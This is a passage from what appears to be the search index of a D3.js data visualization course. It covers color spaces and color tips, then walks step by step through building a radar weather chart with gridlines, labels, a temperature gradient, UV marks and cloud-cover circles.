line 33. <code>interpolateWithSteps(n)</code> returns a new array of n elements interpolating between <code>0</code> and <code>1</code>. For example, <code>interpolateWithSteps(3)</code> returns <code>[0, 0.5, 1]</code>.</p> <p>We can use this function to make a new color scheme by stepping through a color scale and returning equally spaced through the range. For example:</p> <pre><code>interpolateWithSteps(6).map(\n    d3.interpolateHcl(\"cyan\", \"tomato\")\n)\n</code></pre> <p>will create the following color scheme.</p> <p></p> <p>We can look at the color scheme by passing a unique id and our scale to <code>addCustomScale()</code>.</p> <pre><code>addCustomScale(\n  \"interpolate-hcl-steps\",\n  interpolateWithSteps(6).map(\n      d3.interpolateHcl(\"cyan\", \"tomato\")\n  )\n)\n</code></pre> <p></p> <p>If we wanted to create discrete color schemes with many colors, we could use one of d3-scale-chromatic's cyclical color scales.</p> <p></p> <p>We can use our <code>interpolateWithSteps()</code> function to split this continuous color scale into a color scheme.</p> <pre><code>interpolateWithSteps(10).map(\n  d3.interpolateRainbow\n)\n</code></pre> <p></p> <p>Play around and make a few color scales or color schemes to get the hang of it.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.07/color-spaces/","title":"Creating our own colors","text":"<p>Colors can be represented in various formats, each with different strengths. But creating our own colors requires care and the color space we use affects how well our chart can be interpreted.</p> <p>Below, we're going to look at three color spaces:</p> <ul> <li>rgb</li> <li>hsl and</li> <li>hcl</li> </ul> <p>While rgb is generally the most familiar, there are good reasons to use hcl when we're programmatically creating color scales. Read on to find out why.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.07/color-spaces/#keywords","title":"keywords","text":"<p>In our chart code, we've used a lot of keywords which map to specific, solid colors. For example, we made our histogram bars cornflowerblue.  Color keywords are great because they are easy to remember and mirror the way we refer to colors in natural language.</p> <p>currentColor</p> <p>Most color keywords are ways we would describe a color in English, but there is one handy special case: <code>currentColor</code>. <code>currentColor</code> will set the CSS property to the current <code>color</code> property. This is great for controlling one-color charts from outside a charting component. For example, we could make a line chart component whose <code>stroke</code> is <code>currentColor</code>. This way, we could easily create multiple line charts with different line colors, just by setting the <code>color</code> higher up in the DOM.</p> <p>transparent</p> <p>Another useful color keyword is <code>transparent</code>. This is great when creating invisible SVG elements that still capture mouse events, such as the listening rect we used to capture mouse movement in Module 5.</p> <p>When creating data visualizations, we'll often need to manipulate colors. In this case, we can't use the color keywords because there is no way to make cornflowerblue 10% darker. In order to manipulate our colors, we'll need to learn about color spaces.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.07/color-spaces/#rgb","title":"rgb","text":"<p>The color space you're most likely to come across when developing for the web is rgb. rgb colors are composed of three values:</p> <p>r: red</p> <p>g: green</p> <p>b: blue</p> <p>For each of these values, a higher number uses more of the specified color. Then these values are combined to create one color.</p> <p>This is essentially how LCD screens work: each pixel is made up of a red, green, and blue light. The values are combined in an additive fashion, starting at black and moving towards white with higher values. This may be counter-intuitive to anyone who's used paint on paper, where more paint = a darker color. For example, <code>rgb(0,0,0)</code> represents black and <code>rgb(255,255,255)</code> represents white.</p> <p>There is another optional value for all of the color spaces we'll talk about:</p> <p>a: alpha</p> <p>The alpha value sets the opacity of the color \u2014 a color with an alpha value of <code>0</code> will be transparent. If the alpha value isn't specified, the color will be fully opaque.</p> <p>rgb can be expressed in two formats. The first, functional notation, starts with <code>rgb</code> and lists each color value, in order, within parentheses. Each value will be within a range from <code>0</code> to <code>255</code>. If we wanted to specify an alpha value, we would switch the prefix to <code>rgba</code>.</p> <p>For example, we would represent a cyan color as a combination of green and blue colors.</p> <p>{width=80%} </p> <p>rgb colors can also be expressed with hexidecimal notation, which begins with <code>#</code> and lists each value with two characters in a range from 00 to FF.</p> <p></p> <p>rgb can be an unintuitive color space to work in \u2014 if I have a blue color and want an orange of the same brightness, all of the values have to change.</p> <p></p> <p>Next, let's look at a color space that is closer to our mental model of color.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.07/color-spaces/#hsl","title":"hsl","text":"<p>In the hsl color space, the values don't refer to specific colors \u2014 instead, they refer to color properties:</p> <p>h: hue. The hue represents the angle around a circular color wheel that starts at red (0 degrees) and cycles through orange, yellow, ...., back around to red (360 degrees).</p> <p>s: saturation. The saturation value starts at gray (0%) and ramps up to a completely saturated color (100%).</p> <p>l: lightness. The lightness value starts at white (0%) and ramps up to black (100%).</p> <p>(a: alpha. Again, the alpha channel is optional and defaults to full opacity (100%))</p> <p>In hsl, our cyan color would be partially around the color wheel, fully saturated, and of medium lightness.</p> <p></p> <p>hsl more closely matches our mental model of the relationship between colors \u2014 to switch from a blue to a similarly dark &amp; saturated orange, we would only have to update the hue value.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.07/color-spaces/#hcl","title":"hcl","text":"<p>The hcl color space is similar to hsl, with the same values (c is for chroma, which is an alternative measure of colorfulness).</p> <p></p> <p>Instead of being spacially uniform, the values are perceptually uniform, so that a red and a blue with a lightness of 50% will look the same amount of light. Let's look at the hue spectrum at 100% saturation and 50% lightness for both hsl (top) and hcl (bottom).</p> <p></p> <p></p> <p>We can see bands of color in the hsl hues that look lighter than the other hues (even though they mathematically aren't). Those bands are not visible in the hcl spectrum.</p> <p>If we create a 3d cylinder of the hsl color space, we would have a perfect cylinder. But when we visualize the hcl color space this way, we can see that it's not a perfect cylinder. This is because humans can't detect changes in saturation for all colors equally.</p> <p>{width=50%} </p> <p>{width=50%} </p> <p>This makes hcl to ideal for creating color scales \u2014 if we're using color to represent different categories of precipitation, those colors should have the same amount of visibility. This will help prevent one color from  dominating and skewing our read of the data.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/","title":"Color tips","text":""},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/#color-tips","title":"Color tips","text":"<p>Here are a few tips to keep in mind when choosing individual colors or a color scale.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/#contrast","title":"Contrast","text":"<p>{width=70%} </p> <p>Make sure that your colors have enough contrast with their surroundings in all cases. If you're using Chrome, there is a great tool to check that your colors have enough contrast right in your dev tools. Learn how to use it in the Appendix.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/#color-blindness","title":"Color blindness","text":"<p>{width=70%} </p> <p>Don't assume that your users can see your charts as clearly as you can. Almost 8 percent of males of North American descent have red-green color blindness. To make sure most people can encode the information from your color scale, stay away from scales where users have to distinguish between red and green.</p> <p>Here's a simulation of what the above picture looks for people with red-green color blindness.</p> <p>{width=70%} </p> <p>It's impossible to see which countries have negative growth and which have positive growth if we use the red/green colors on the left for our color scale on the map we created in Chapter 6.</p> <p></p> <p>There are other forms of color blindness (yellow-blue and total), but they are less common (under 1% of the population). When creating a chart with a color scale, it helps to have a second way to extract the information, such as adding tooltips or in-place labels.</p> <p>There are sites where you can simulate different types of color blindness to test your data visualizations, such as Color Flip.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/#comparing-colors","title":"Comparing colors","text":"<p>{width=70%} </p> <p>Smaller areas of color need are harder to compare. When using colors as an indicator, make sure the colored elements are large enough.</p> <p>Additionally, far-apart areas of color are harder to compare. Make sure the colors you use have enough contrast that users can easily tell the difference.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/#semantics","title":"Semantics","text":"<p>{width=70%} </p> <p>Choose semantically meaningful colors when possible. For example, blue for lower and red for higher temperatures.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.08/color-tips/#gray","title":"Gray","text":"<p>{width=70%} </p> <p>Gray can be the most important color. When you want to highlight part of a chart, keeping other elements gray helps viewers focus on that element.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.09/wrapping-up/","title":"Wrapping up","text":"<p>Great work making it through this chapter! Fundamentals can be tedious to learn, but understanding the bare bones will give you a good foundation to making your own data visualizations.</p> <p>If you want a handy way to remember these basics, we included a cheat sheet PDF -- feel free to print it out or store it somewhere easy-to-find!</p> <p></p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.10/exercise-week-6/","title":"This week's exercise","text":"<p>Awesome work getting through all of those design tricks! During this week, redesign one of the custom charts you created in our previous exercises, using the concepts we learned this week!</p> <p>Choose whichever chart you are most excited about redesigning. Try to go as far outside the box as possible - no worries if your first few attempts don't work out, this is the time to learn your taste and what works for you!</p> <p>Now, go over the same steps we went through this week to redesign one of your custom charts, as much as possible.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.00/radar-weather-chart/","title":"Radar Weather Chart","text":"<p>For this project, we'll build a more complex radar chart.</p> <p>{width=75%} </p> <p>This chart will give the viewer a sense of overall weather for the whole year, and will highlight trends such as:</p> <ul> <li>What time of the year is cloudiest, and does that correlate with the coldest days?</li> <li>Do cloudy days have lower UV indices, or are they rainier?</li> <li>How does weather vary per season?</li> </ul> <p>The complexity of this chart will increase the amount of time the viewer needs to wrap their head around it. But once the viewer understands it, they can answer more nuanced questions than a simpler chart.</p> <p>We'll reinforce concepts we've already learned as well as new concepts, such as angular math, as we build this visualization. Let's get started!</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.01/getting-set-up/","title":"Getting set up","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.01/getting-set-up/#getting-set-up","title":"Getting set up","text":"<p>We've already done a few of the steps, since they should be really familiar by now: we've grabbed our data, created square dimensions, and drawn our canvas.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.01/getting-set-up/#accessing-the-data","title":"Accessing the data","text":"<p>To start, let's create our data accessors. Doing this up front will remind us of the structure of our data, and let us focus on drawing our chart later.</p> <p>Let's look at the first data point by logging it out to our console after we fetch our data:</p> <pre><code>const dataset = await d3.json(\"./data/my_weather_data.json\")\nconsole.table(dataset[0])\n</code></pre> <p>{width=50%} </p> <p>Since we already know what our final chart will look like, we can pull out all of the metrics we'll need. Let's create an accessor for each of the metrics we'll plot (min temperature, max temperature, precipitation, cloud cover, uv, and date).</p> <p>{lang=javascript,crop-query=.temperatureMinAccessor-.dateAccessor} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>That's a mouthful! Thankfully, we got that out of the way and won't need to look at the exact structure of our data again.</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.01/getting-set-up/#creating-our-scales","title":"Creating our scales","text":"<p>Next, we'll want to create scales to convert our weather metrics into physical properties so we know where to draw our data elements.</p> <p>The location of a data element around the radar chart's center corresponds to its date. Let's create a scale that converts a date into an angle.</p> <p>{lang=javascript,crop-query=context(.angleScale, 2, 0)} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>A&gt;Note that we're using radians, instead of degrees. Angular math is generally easier with radians, and we'll want to use <code>Math.sin()</code> and <code>Math.cos()</code> later, which deals with radians. There are 2\u03c0 radians in a full circle. If you want to know more about radians, the Wikipedia entry is a good source.</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.01/getting-set-up/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.02/adding-gridlines/","title":"Adding gridlines","text":"<p>To get our feet wet with this angular math, we'll draw our peripherals before we draw our data elements.</p> <p></p> <p>Let's switch those steps in our code.</p> <pre><code>  // 6. Draw peripherals\n\n\n  // 5. Draw data\n</code></pre> <p>If your first thought was \"but the checklist!\", here's a reminder that our chart drawing checklist is here as a friendly guide, and we can switch the order of steps if we need to.</p> <p>Drawing the grid lines (peripheral) first is helpful in cases like this where we want our data elements to layer on top. If we wanted to keep our steps in order, we could also create a <code>&lt;g&gt;</code> element first to add our grid lines to after.</p> <p>Creating a group to hold our grid elements is also a good idea to keep our elements organized -- let's do that now.</p> <p>{lang=javascript,crop-query=.peripherals} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.02/adding-gridlines/#draw-month-grid-lines","title":"Draw month grid lines","text":"<p>Next, let's create one \"spoke\" for each month in our dataset. First, we'll need to create an array of each month. We already know what our first and last dates are -- they are the <code>.domain()</code> of our <code>angleScale</code>. But how can we create a list of each month between those two dates?</p> <p>The d3-time module has various intervals, which represent various units of time. For example, <code>d3.timeMinute()</code> represents every minute and <code>d3.timeWeek()</code> represents every week.</p> <p>Each of these intervals has a few methods -- we can see those methods in the documentation, and also if we double-click into the source code in our dev tools console.</p> <p>{width=70%} </p> <p>For example, we could use the <code>.floor()</code> method to get the first \"time\" in the current month:</p> <pre><code>d3.timeMonth.floor(new Date())\n</code></pre> <p></p> <p>d3 time intervals also have a <code>.range()</code> method that will return a list of ndatetime objects, spaced by the specified interval, between two dates, passed as parameters.</p> <p>Let's try it out by creating our list of months!</p> <pre><code>const months = d3.timeMonth.range(...angleScale.domain())\nconsole.log(months)\n</code></pre> <p>Great! Now we have an array of datetime objects corresponding to the beginning of each month in our dataset.</p> <p></p> <p>d3-time gives us shortcut aliases that can make our code even more concise -- we can use <code>d3.timeMonth()</code> instead of <code>d3.timeMonth.range()</code>.</p> <p>{lang=javascript,crop-query=.months} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Let's use our array of months and draw one <code>&lt;line&gt;</code> per month.</p> <pre><code>const gridLines = months.forEach(month =&gt; {\n  return peripherals.append(\"line\")\n})\n</code></pre> <p>We'll need to find the angle for each month -- let's use our <code>angleScale</code> to convert the date into an angle.</p> <pre><code>const gridLines = months.forEach(month =&gt; {\n  const angle = angleScale(month)\n\n  return peripherals.append(\"line\")\n})\n</code></pre> <p>Each spoke will start in the middle of our chart -- we could start those lines at <code>[dimensions.boundedRadius, dimensions.boundedRadius]</code>, but most of our element will need to be shifted in respect to the center of our chart.</p> <p>Remember how we use our bounds to shift our chart according to our <code>top</code> and <code>left</code> margins?</p> <p>{width=75%} </p> <p>To make our math simpler, let's instead shift our bounds to start in the center of our chart.</p> <p>{width=75%} </p> <p>This will help us when we decide where to place our data and peripheral elements -- we'll only need to know where they lie in respect to the center of our circle.</p> <p>{lang=javascript,crop-query=.bounds} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>We'll need to convert from angle to <code>[x, y]</code> coordinate many times in this chart. Let's create a function that makes that conversion for us. Our function will take two parameters:</p> <ol> <li>the angle</li> <li>the offset</li> </ol> <p>and return the <code>[x,y]</code> coordinates of a point rotated <code>angle</code> radians around the center, and <code>offset</code> time our circle's radius (<code>dimensions.boundedRadius</code>). This will give us the ability to draw elements at different radii (for example, to draw our precipitation bubbles slightly outside of our temperature chart, we'll offset them by <code>1.14</code> times our normal radius length).</p> <pre><code>const getCoordinatesForAngle = (angle, offset=1) =&gt; []\n</code></pre> <p>To convert an angle into a coordinate, we'll dig into our knowledge of trigonometry. Let's look at the right-angle triangle (a triangle with a 90-degree angle) created by connecting our origin point (<code>[0,0]</code>) and our destination point (<code>[x,y]</code>).</p> <p></p> <p>The numbers we already know are theta (\u03b8) and the hypotenuse (<code>dimensions.boundedRadius * offset</code>). We can use these numbers to calculate the lengths of the <code>adjacent</code> and <code>opposite</code> sides of our triangle, which will correspond to the <code>x</code> and <code>y</code> position of our destination point.</p> <p>Because our triangle has a right angle, we can multiply the <code>sine</code> and <code>cosine</code> of our <code>angle</code> by the length of our hypotenuse to calculate our <code>x</code> and <code>y</code> values (remember the soh cah toa mnenomic?).</p> <p></p> <p>Let's implement this in our <code>getCoordinatesForAngle()</code> function.</p> <pre><code>const getCoordinatesForAngle = (angle, offset=1) =&gt; [\n  Math.cos(angle) * dimensions.boundedRadius * offset,\n  Math.sin(angle) * dimensions.boundedRadius * offset,\n]\n</code></pre> <p>This looks great! But we have to make one more tweak to our <code>getCoordinatesForAngle()</code> function -- an angle of <code>0</code> would draw a line horizontally to the right of the origin point. But our radar chart starts in the center, above our origin point. Let's rotate our angles by \u00bc turn to return the correct points.</p> <p></p> <p>A&gt;Remember that there are 2\u03c0 radians in one full circle, so \u00bc turn would be 2\u03c0 / 4, or \u03c0 / 2.</p> <p>{lang=javascript,crop-query=.getCoordinatesForAngle} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Whew! That was a a lot of math. Now let's use it to draw our grid lines.</p> <p>If we move back down in our <code>chart.js</code> file, let's grab the <code>x</code> and <code>y</code> coordinates of the end of our spokes and set our <code>&lt;line&gt;</code>s' <code>x2</code> and <code>y2</code> attributes.</p> <p>A&gt;We don't need to set the <code>x1</code> or <code>y1</code> attributes of our line because they both default to <code>0</code>.</p> <pre><code>months.forEach(month =&gt; {\n const angle = angleScale(month)\n const [x, y] = getCoordinatesForAngle(angle)\n\n peripherals.append(\"line\")\n   .attr(\"x2\", x)\n   .attr(\"y2\", y)\n   .attr(\"class\", \"grid-line\")\n})\n</code></pre> <p>Hmm, we can't see anything yet. Let's give our lines a <code>stroke</code> color in our <code>styles.css</code> file.</p> <pre><code>.grid-line {\n    stroke: #dadadd;\n}\n</code></pre> <p>Finally! We have 12 spokes to show where each of the months in our chart start.</p> <p>{width=75%} </p> <p>A&gt;Your spokes might be rotated a bit, depending on when your dataset starts.</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.02/adding-gridlines/#draw-month-labels","title":"Draw month labels","text":"<p>Our viewers won't know which month each spoke is depicting -- let's label each of our spokes. While we're looping over our months, let's also get the <code>[x, y]</code> coordinates of a point 1.38 times our chart's radius away from the center of our chart. This will give us room to draw the rest of our chart within our month labels.</p> <pre><code>months.forEach(month =&gt; {\n const angle = angleScale(month)\n const [x, y] = getCoordinatesForAngle(angle)\n\n peripherals.append(\"line\")\n   .attr(\"x2\", x)\n   .attr(\"y2\", y)\n   .attr(\"class\", \"grid-line\")\n\n const [labelX, labelY] = getCoordinatesForAngle(angle, 1.38)\n peripherals.append(\"text\")\n   .attr(\"x\", labelX)\n   .attr(\"y\", labelY)\n   .attr(\"class\", \"tick-label\")\n   .text(d3.timeFormat(\"%b\")(month))\n})\n</code></pre> <p>We can see our month labels now, but there's one issue: the labels on the left are closer to our spokes than the labels on the right.</p> <p>{width=75%} </p> <p>This is because our <code>&lt;text&gt;</code> elements are anchored by their left side. Let's dynamically set their <code>text-anchor</code> property, depending on the label's <code>x</code> position. We'll align labels on the left by the <code>end</code> of the text, and labels near the center by their <code>middle</code>.</p> <p>A&gt;Note that <code>text-anchor</code> is essentially the <code>text-align</code> CSS property for SVG elements.</p> <pre><code>.text(d3.timeFormat(\"%b\")(month))\n.style(\"text-anchor\",\n  Math.abs(labelX) &lt; 5 ? \"middle\" :\n  labelX &gt; 0           ? \"start\"  :\n                         \"end\"\n)\n</code></pre> <p>{width=75%} </p> <p>Our labels also aren't centered vertically with our spokes. Let's center them, using <code>dominant-baseline</code>, and update their styling to decrease their visual weight. We want our labels to orient our users, but not to distract from our data.</p> <pre><code>.tick-label {\n    dominant-baseline: middle;\n    fill: #8395a7;\n    font-size: 0.7em;\n    font-weight: 900;\n    letter-spacing: 0.005em;\n}\n</code></pre> <p>Looking much better!</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.02/adding-gridlines/#adding-temperature-grid-lines","title":"Adding temperature grid lines","text":"<p>Our final chart has circular grid marks that mark different temperatures. Before we add this, we need a temperature scale that converts a temperature to a radius. Higher temperatures are drawn further from the center of our chart.</p> <p>Let's add a <code>radiusScale</code> at the end of our Create scales section. We'll want to use <code>nice()</code> to give us friendlier minimum and maximum values, since the exact start and end doesn't matter. Note that we didn't use <code>.nice()</code> to round the edges of our <code>angleScale</code>, since we want it to start and end exactly with its range.</p> <p>{lang=javascript,crop-query=.radiusScale} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>A&gt;We're using the ES6 spread operator (<code>...</code>) to spread our arrays of min and max temperatures so we get one flat array with both arrays concatenated. If you're unfamiliar with this syntax, feel free to read more here.</p> <p>We'll be converting a single data point into an <code>x</code> or <code>y</code> value many times -- let's create two utility functions to help us to do just that. It seems simple enough now, but it's nice to have this logic in one place and not cluttering our <code>.attr()</code> functions.</p> <p>{lang=javascript,crop-query=.getXFromDataPoint-.getYFromDataPoint} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Let's put this scale to use! At the end of our Draw peripherals step, let's add a few circle grid lines that correspond to temperatures within our <code>radiusScale</code>.</p> <p>{lang=javascript,crop-query=.temperatureTicks-.gridCircles} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Since <code>&lt;circle&gt;</code> elements default to a black fill, we won't be able to see much yet.</p> <p>{width=75%} </p> <p>Let's add some styles to remove the fill from any <code>.grid-line</code> elements and add a faint <code>stroke</code>.</p> <pre><code>.grid-line {\n    fill: none;\n    stroke: #dadadd;\n}\n</code></pre> <p>Wonderful! Now we can see our concentric circles on our chart.</p> <p>{width=75%} </p> <p>Similar to our month lines, we'll need labels to tell our viewers what temperature each of these circles represents.</p> <p>{lang=javascript,crop-query=.tickLabels} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>A&gt;Notice that we're returning early if <code>d</code> is falsey -- we don't want to make a label for a temperature of <code>0</code>.</p> <p>We'll need to vertically center and dim our labels -- let's update our</p> <p><code>.tick-label-temperature</code> elements in our <code>styles.css</code> file.</p> <pre><code>.tick-label-temperature {\n    fill: #8395a7;\n    opacity: 0.7;\n    font-size: 0.7em;\n    dominant-baseline: middle;\n}\n</code></pre> <p>These labels are very helpful, but they're a little hard to read on top of our grid lines.</p> <p>{width=75%} </p> <p>Let's add a <code>&lt;rect&gt;</code> behind our labels that's the same color as the background of our page. We'll need to add this code before we draw our <code>tickLabels</code> and after our <code>gridCircles</code>, since SVG stacks elements in the order we draw them.</p> <p>{lang=javascript,crop-query=.tickLabelBackgrounds} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>That's much easier to read!</p> <p>{width=75%} </p> <p>Great! We're all set with our grid marks and ready to draw some data!</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.02/adding-gridlines/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.03/adding-freezing/","title":"Adding freezing","text":"<p>Let's ease into drawing our data elements by drawing a <code>&lt;circle&gt;</code> to show where freezing is on our chart. We'll want to write this code in our Draw data step.</p> <p>We can first check if our temperatures drop low enough:</p> <p>{lang=javascript,crop-query=.containsFreezing} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>If our temperatures do drop below freezing, we'll add a <code>&lt;circle&gt;</code> whose radius ends at 32 degrees Fahrenheit.</p> <pre><code>if (containsFreezing) {\n const freezingCircle = bounds.append(\"circle\")\n   .attr(\"r\", radiusScale(32))\n   .attr(\"class\", \"freezing-circle\")\n}\n</code></pre> <p>Let's set the fill color and opacity of our circle to be a light cyan.</p> <pre><code>.freezing-circle {\n    fill: #00d2d3;\n    opacity: 0.15;\n}\n</code></pre> <p>Great! Now we can see where the freezing temperatures will lie on our chart.</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.03/adding-freezing/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.04/adding-the-temperature-area/","title":"Adding the temperature area","text":"<p>Our finished chart has a shape that covers the minimum and maximum temperatures for each day. Our first instinct to draw an area is to use <code>d3.area()</code>, but <code>d3.area()</code> will only take an <code>x</code> and a <code>y</code> position.</p> <p>Instead, we want to use d3.areaRadial(), which is similar to <code>d3.area()</code>, but has <code>.angle()</code> and <code>.radius()</code> methods. Since we want our area to span the minimum and maximum temperature for a day, we can use <code>.innerRadius()</code> and <code>.outerRadius()</code> instead of one <code>.radius()</code>.</p> <p>{lang=javascript,crop-query=.areaGenerator} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Like <code>.line()</code> and <code>.area()</code> generators, our <code>areaGenerator()</code> will return the <code>d</code> attribute string for a <code>&lt;path&gt;</code> element, given a dataset. Let's create a <code>&lt;path&gt;</code> element and set its <code>d</code> attribute.</p> <pre><code>const area = bounds.append(\"path\")\n   .attr(\"class\", \"area\")\n   .attr(\"d\", areaGenerator(dataset))\n</code></pre> <p>Perfect! Now our chart is starting to take shape.</p> <p>{width=75%} </p> <p>Sometimes displaying a metric in multiple ways can help focus the viewer on it and also give them two ways to encode it. Let's also visualize the temperature with a gradient.</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.04/adding-the-temperature-area/#drawing-a-gradient","title":"Drawing a gradient","text":"<p>Let's create a gradient at the end of our Draw canvas step.</p> <p>To make a gradient in SVG, we'll need to create a <code>&lt;linearGradient&gt;</code> or <code>&lt;radialGradient&gt;</code> SVG element.</p> <p>Within that, we'll create several <code>&lt;stop&gt;</code> SVG elements that will tell the gradient what colors to interpolate between, using <code>stop-color</code> and <code>offset</code> attributes.</p> <p>For example, this HTML code:</p> <pre><code>&lt;linearGradient&gt;\n    &lt;stop stop-color=\"#12CBC4\" offset=\"0%\"&gt;&lt;/stop&gt;\n    &lt;stop stop-color=\"#FFC312\" offset=\"50%\"&gt;&lt;/stop&gt;\n    &lt;stop stop-color=\"#B53471\" offset=\"100%\"&gt;&lt;/stop&gt;\n&lt;/linearGradient&gt;\n</code></pre> <p>will create this gradient:</p> <p></p> <p>The <code>offset</code>'s percentage value is in proportion to the element using the <code>&lt;linearGradient&gt;</code>.</p> <p>We'll create our gradient within a <code>&lt;defs&gt;</code> element, to keep our code organized so we know where to find re-useable elements. Creating <code>&lt;defs&gt;</code> elements near the top helps organize our code -- we'll know where to find elements that are re-useable.</p> <pre><code>const defs = wrapper.append(\"defs\")\n</code></pre> <p>A <code>&lt;linearGradient&gt;</code> is the simplest gradient, but here, we'll want to use a <code>&lt;radialGradient&gt;</code>.</p> <p>{lang=javascript,crop-query=context(.gradientColorScale, 6, 7)} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>To use a gradient, all we need to do is set the <code>fill</code> or <code>stroke</code> of a SVG element to <code>url(#GRADIENT_ID)</code> (where <code>GRADIENT_ID</code> matches the gradient's <code>id</code> attribute).</p> <p>{lang=javascript,crop-query=.area} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Great! Now we can see that our gradient re-enforces the relationship between distance from the origin and higher temperatures.</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.04/adding-the-temperature-area/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.05/adding-the-uv-index-marks/","title":"Adding the UV index marks","text":"<p>Next, let's mark days that have a high UV index. But what does a \"high UV index\" mean? We'll need to make that decision ourselves -- let's define a \"high UV day\" as any day with a UV index over 8.</p> <p>{lang=javascript,crop-query=.uvIndexThreshold} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>These kinds of decisions will come from your expertise as a subject matter expert. When setting a threshold like this in your own charts, think about what might be meaningful to the viewer.</p> <p>Let's keep our code organized and keep our UV index lines within one group.</p> <p>{lang=javascript,crop-query=.uvGroup} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>We want to draw our UV lines just inside the edges of our radius -- let's set their <code>offset</code> to <code>0.95</code>.</p> <p>{lang=javascript,crop-query=.uvOffset} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Next, let's draw one <code>&lt;line&gt;</code> per day over our threshold, drawing the outside edge just outside of our chart's radius.</p> <p>{lang=javascript,crop-query=.highUvDays} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>We won't be able to see our <code>&lt;line&gt;</code>s until we give them a stroke -- let's add a stroke color and width in our <code>styles.css</code> file.</p> <pre><code>.uv-line {\n     stroke: #feca57;\n    stroke-width: 2;\n}\n</code></pre> <p>Now we can see that all of the days with high UV index are between April and September, with the highest density around July.</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.05/adding-the-uv-index-marks/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.06/adding-the-cloud-cover-bubbles/","title":"Adding the cloud cover bubbles","text":"<p>Next, let's add the gray circles around our chart that show how much cloud cover each day has. As a reminder, this is what our final chart will look like:</p> <p>{width=75%} </p> <p>The radius of each of our circles will depend on the amount of cloud cover.</p> <p>A&gt;As an example of how we can use different dimensions to visualize a metric (like we learned in Module 6), we could have encoded the amount of cloud cover as the color of each circle, instead of the size. In this case, size works better because we're already using a color scale for our temperature and our precipitation type. To prevent from distracting the eye with too many colors, we'll vary our cloud cover circles by size instead.</p> <p>One caveat with visualizing a linear scale with a circle's size is that circles' areas and radii scale at different rates. Let's take a circle with a radius of 100px as an example. If we multiply its radius by 2, we'll get a circle with a radius of 200. However, the circle grows in every direction, making this larger circle cover four times as much space.</p> <p></p> <p>Instead, we'll want a circle with a radius of 141 pixels to create a circle that is twice as large as our original circle.</p> <p></p> <p>Since we, as humans, judge a circle by the amount of space it takes up, instead of how wide it is, we need a way to size our circles by their area instead of their radii. But <code>&lt;circle&gt;</code> elements are sized with their <code>r</code> attribute, so we need a way to scale our radii so that our areas scale linearly.</p> <p>The area of a circle is the radius multiplied by \u03c0, then squared. If we flip this equation around, we'll find that the radius of a circle is the square root of a circle's area, divided by \u03c0.</p> <p>{width=75%} </p> <p>Since \u03c0 is a constant, we can represent the relationship simply by using a square root scale. How convenient!</p> <p>Whenever we're scaling a circle's radius, we'll want to use <code>d3.scaleSqrt()</code> instead of <code>d3.scaleLinear()</code> to keep the circles' areas scaling proportionally.</p> <p>Let's create our cloud cover radius scale, making our circles' radii range from <code>1</code> to <code>10</code> pixels.</p> <p>A&gt;We'll write this code at the end of our Create scales step.</p> 